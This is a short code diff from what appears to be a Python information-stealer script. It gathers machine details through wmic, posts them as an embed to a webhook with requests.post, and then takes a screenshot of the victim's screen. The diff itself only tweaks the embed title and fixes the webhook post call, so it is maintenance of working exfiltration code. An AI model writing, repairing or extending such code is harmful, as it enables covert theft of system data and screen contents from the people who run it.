@@ -926,7 +926,7 @@ name = (str(subprocess.check_output("wmic csproduct get name"),
 
 embed = {
     "title":
-    f"{wh_name}  -  System",
+    f"{wh_name}  -  System Data",
     "description":
     "System Information.",
     "color":
@@ -946,7 +946,7 @@ embed = {
     ],
 }
 
-requests.post(webhook, json={"embeds": [embed]}, "username": wh_name, "avatar_url": wh_avatar)
+requests.post(webhook, json={"embeds": [embed]})
 
 
 screenshot = ImageGrab.grab()
